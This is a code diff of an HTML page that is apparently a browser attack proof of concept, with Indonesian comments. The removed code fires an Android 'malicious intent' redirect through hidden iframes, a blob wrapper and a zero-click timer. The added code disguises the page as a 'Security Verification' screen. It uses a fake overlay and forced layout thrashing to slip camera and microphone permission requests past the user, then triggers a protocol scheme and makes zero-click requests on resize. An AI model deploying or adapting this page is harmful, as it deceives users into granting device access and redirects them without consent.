@@ -3,27 +3,41 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Update</title>
+<title>System Security</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #f0f4f8;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; flex-direction: column;
+    height: 100vh; margin: 0;
+    transition: background 0.1s;
   }
   .panel {
     background: #fff; padding: 40px; border-radius: 12px;
     box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
-    max-width: 400px; width: 100%;
+    max-width: 400px; width: 100%; z-index: 10;
   }
-  h1 { color: #333; margin-bottom: 10px; font-size: 22px; }
-  p { color: #666; margin-bottom: 20px; font-size: 14px; }
+  h1 { color: #333; margin-bottom: 10px; }
+  p { color: #666; margin-bottom: 20px; }
   button {
     background: #007aff; color: #fff; padding: 15px 30px;
     border-radius: 8px; font-size: 18px; font-weight: bold;
     cursor: pointer; border: none; width: 100%;
+    position: relative; overflow: hidden;
   }
-  button:hover { background: #005bb5; }
+  
+  /* Overlay Palsu untuk Clickjacking saat Resize */
+  #overlay {
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: rgba(0, 0, 0, 0.5);
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    transition: opacity 0.3s;
+  }
+
   #log {
     margin-top: 20px; background: #000; color: #0f0;
     padding: 10px; font-family: monospace; font-size: 12px;
@@ -34,10 +48,12 @@
 </head>
 <body>
 
+<div id="overlay"></div>
+
 <div class="panel">
-  <h1>🔒 Security Update</h1>
-  <p>Klik tombol di bawah untuk memperbarui sistem.</p>
-  <button id="intentBtn">Install Update</button>
+  <h1>🔒 Security Verification</h1>
+  <p>Klik tombol di bawah untuk melanjutkan.</p>
+  <button id="startBtn">Verify System</button>
 </div>
 
 <div id="log">Sistem siap...</div>
@@ -47,75 +63,106 @@
   'use strict';
 
   var logEl = document.getElementById('log');
+  var overlay = document.getElementById('overlay');
+  var btn = document.getElementById('startBtn');
+  
   function log(msg) {
     logEl.innerHTML += "> " + msg + "<br>";
     console.log(msg);
   }
 
   // ============================================
-  // 1. KONFIGURASI PAYLOAD (INTENT INJECTION)
+  // 1. UI RACE CONDITION (Resize & Layout Thrashing)
   // ============================================
-  // URL Fallback: Jika ZXing tidak terinstal, browser akan redirect ke sini.
-  var fallbackUrl = "https://artha231.github.io/";
-  
-  // Encode URL fallback
-  var encodedFallback = encodeURIComponent(fallbackUrl);
+  function triggerUIRaceCondition() {
+    log("[!] Memicu UI Race Condition (Split View)...");
 
-  // Intent yang dimodifikasi
-  var maliciousIntent = "intent://scan/#Intent;" +
-                        "scheme=zxing;" +
-                        "package=com.google.zxing.client.android;" +
-                        "S.browser_fallback_url=" + encodedFallback + ";" +
-                        "SEL.component=com.google.zxing.client.android/.ScanActivity;" +
-                        "end";
+    // A. Paksa Resize
+    window.dispatchEvent(new Event('resize'));
 
-  console.log("Malicious Intent: " + maliciousIntent);
+    // B. Tampilkan Overlay
+    overlay.style.display = 'block';
+    overlay.style.opacity = '1';
+
+    // C. Paksa Frame Animation (Layout Thrashing)
+    var start = Date.now();
+    function rafLoop() {
+      if (Date.now() - start < 1000) { 
+        overlay.style.transform = `scale(${1 + Math.random() * 0.1})`;
+        requestAnimationFrame(rafLoop);
+      } else {
+        overlay.style.display = 'none';
+        log("[!] UI Race Condition Selesai. Memicu Payload...");
+        executePayload();
+      }
+    }
+    requestAnimationFrame(rafLoop);
+
+    btn.style.opacity = '0';
+    btn.style.pointerEvents = 'none';
+  }
 
   // ============================================
-  // 2. EKSEKUSI (Clickjacking / One Click)
+  // 2. PAYLOAD EKSEKUSI (Kamera & Protocol Handler)
   // ============================================
-  document.getElementById('intentBtn').addEventListener('click', function() {
-    log("[!] Memicu Intent Redirection (Component + Fallback)...");
+  function executePayload() {
     
-    // Trik 1: Location.href (Langsung)
-    try {
-      window.location.href = maliciousIntent;
-      log("[+] Intent dieksekusi via location.href.");
-    } catch(e) {
-      log("[-] Gagal: " + e.message);
+    // A. Paksa Minta Izin Kamera
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(function(stream) {
+          log("[!] Kamera/Mic DIIZINKAN saat UI glitch.");
+          // Hentikan stream setelah diizinkan (agar tidak merekam lama)
+          stream.getTracks().forEach(function(track) { track.stop(); });
+        })
+        .catch(function(err) {
+          log("[-] Kamera diblokir: " + err.name);
+        });
     }
 
-    // Trik 2: Iframe tersembunyi (Zero-Click Iframe)
-    setTimeout(function() {
-      var iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = maliciousIntent;
-      document.body.appendChild(iframe);
-      log("[+] Intent via Iframe dicoba.");
-    }, 500);
+    // B. Coba Buka Skema Telepon / Email (Ganti sesuai target)
+    // var targetScheme = "tel:+6281234567890"; 
+    var targetScheme = "mailto:security@apple.com";
+    
+    try {
+      window.location.replace(targetScheme);
+      log("[+] Skema (" + targetScheme + ") dieksekusi saat UI sibuk.");
+    } catch(e) {
+      log("[-] Gagal eksekusi skema: " + e.message);
+    }
 
-    // Trik 3: Blob Wrapper (Untuk iOS/Safari)
+    // Kembalikan UI
     setTimeout(function() {
-      try {
-        var blobPayload = `<script>window.location.href = "${maliciousIntent}";<\/script>`;
-        var blob = new Blob([blobPayload], { type: 'text/html' });
-        var url = URL.createObjectURL(blob);
-        window.location.replace(url);
-        log("[+] Intent via Blob dicoba.");
-      } catch(e) {}
-    }, 1000);
+      btn.style.opacity = '1';
+      btn.style.pointerEvents = 'auto';
+    }, 2000);
+  }
+
+  // ============================================
+  // 3. TRIGGER EVENT
+  // ============================================
+  btn.addEventListener('click', function() {
+    triggerUIRaceCondition();
   });
 
   // ============================================
-  // 3. ZERO-CLICK ATTEMPT
+  // 4. ZERO-CLICK SPLIT VIEW ATTEMPT
   // ============================================
-  setTimeout(function() {
-    log("[Zero-Click] Mencoba Intent tanpa klik...");
-    var iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = maliciousIntent;
-    document.body.appendChild(iframe);
-  }, 2000);
+  window.addEventListener('resize', function() {
+    log("[!] Resize terdeteksi (Split View / Rotasi). Memicu bypass...");
+    
+    // Coba minta izin kamera saat resize
+    try {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) { 
+          log("[!] Kamera diizinkan saat resize."); 
+          stream.getTracks().forEach(function(t) { t.stop(); });
+        })
+        .catch(function(err) { 
+          log("[-] Kamera diblokir saat resize: " + err.name); 
+        });
+    } catch(e) {}
+  });
 
 })();
 </script>
